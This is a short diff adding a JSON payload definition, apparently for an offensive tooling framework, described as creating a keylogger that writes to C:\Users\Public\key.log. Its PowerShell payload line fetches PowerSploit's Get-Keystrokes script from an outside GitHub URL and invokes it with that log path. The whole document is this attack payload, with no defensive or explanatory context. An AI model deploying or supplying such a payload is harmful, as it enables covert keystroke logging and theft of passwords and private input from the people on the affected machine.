@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "creates a keylogger that stores in C:\\Users\\Public\\key.log",
+      "type": "other",
+      "exec": "powershell"
+    },
+    "payload": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\\Users\\Public\\key.log"
+  }
+}
